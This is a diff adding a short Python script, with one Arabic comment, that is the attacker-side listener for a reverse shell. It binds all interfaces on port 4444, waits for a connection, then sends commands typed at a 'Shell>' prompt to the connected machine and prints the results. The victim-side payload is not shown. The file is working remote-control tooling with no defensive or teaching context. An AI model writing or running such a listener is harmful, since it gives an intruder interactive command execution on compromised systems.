@@ -1,0 +1,22 @@
+import socket
+
+def start_server():
+    host = '0.0.0.0' # التنصت على جميع الشبكات
+    port = 4444
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((host, port))
+    s.listen(5)
+    print(f"[*] Listening on {host}:{port}...")
+    client, addr = s.accept()
+    print(f"[*] Connection from {addr}")
+    while True:
+        cmd = input("Shell> ")
+        client.send(cmd.encode())
+        if cmd.lower() == 'exit': break
+        result = client.recv(4096).decode()
+        print(result)
+    client.close()
+    s.close()
+
+if __name__ == "__main__":
+    start_server()
